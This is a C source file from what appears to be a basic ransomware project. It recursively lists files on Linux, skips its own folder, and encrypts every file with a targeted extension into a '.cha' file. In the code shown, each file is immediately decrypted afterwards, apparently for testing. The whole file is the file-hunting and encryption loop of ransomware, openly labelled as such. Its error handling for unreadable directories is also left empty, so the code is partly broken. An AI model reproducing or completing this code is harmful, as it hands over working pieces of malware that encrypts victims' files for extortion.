//
//
//
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <dirent.h>
#include <time.h>
#include <curl/curl.h>
#include <sys/stat.h>
#include <fcntl.h>


#include "files.h"

void listAndProcessFiles(const char *path, const char **extensions, size_t num_extensions, const unsigned char *key, size_t key_size, const unsigned char *iv, size_t iv_size, const unsigned char *aad) {
    PathList pathList;
    initPathList(&pathList);
    linuxListFiles(path, &pathList);

    for (size_t i = 0; i < pathList.count; ++i) {
        if (strstr(pathList.paths[i], "basic_c_ransomware/") != NULL) {
            continue;
        }
        
        char *extension = strrchr(pathList.paths[i], '.');
        if (extension != NULL) {
            for (size_t j = 0; j < num_extensions; ++j) {
                if (strcmp(extension, extensions[j]) == 0) {
                    encrypt_file(key, iv, aad, pathList.paths[i]);
                    sleep(1);
                    char encrypted_path[1024];
                    snprintf(encrypted_path, sizeof(encrypted_path), "%s.cha", pathList.paths[i]);
                    decryptFile(key, iv, aad, encrypted_path);
                    break;
                }
            }
        }
    }

    freePathList(&pathList);
}

//->Linux functions
void linuxListFiles(const char *path, PathList *pathList) {
    struct dirent *entry;
    DIR *dp = opendir(path);

    if (dp == NULL) {
        //Woops
    }

    while ((entry = readdir(dp)) != NULL) {
        if (entry->d_type == DT_REG) {
            char file_path[1024];
            snprintf(file_path, sizeof(file_path), "%s/%s", path, entry->d_name);
            addToPathList(pathList, file_path);
        } else if (entry->d_type == DT_DIR) {
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                char subPath[1024];
                snprintf(subPath, sizeof(subPath), "%s/%s", path, entry->d_name);
                linuxListFiles(subPath, pathList);
            }
        }
    }

    closedir(dp);
}

//Init PathList structure
void initPathList(PathList *pathList) {
    pathList->paths = NULL;
    pathList->count = 0;
    pathList->capacity = 0;
}

void addToPathList(PathList *pathList, const char *path) {
    if (pathList->count >= pathList->capacity) {
        //Increase list size
        pathList->capacity = (pathList->capacity == 0) ? 1 : pathList->capacity * 2;
        pathList->paths = realloc(pathList->paths, pathList->capacity * sizeof(char *));
    }

    pathList->paths[pathList->count] = strdup(path);
    pathList->count++;
}

void freePathList(PathList *pathList) {
    for (size_t i = 0; i < pathList->count; i++) {
        free(pathList->paths[i]);
    }
    free(pathList->paths);
    pathList->paths = NULL;
    pathList->count = 0;
    pathList->capacity = 0;
}
//<-End of linux functions
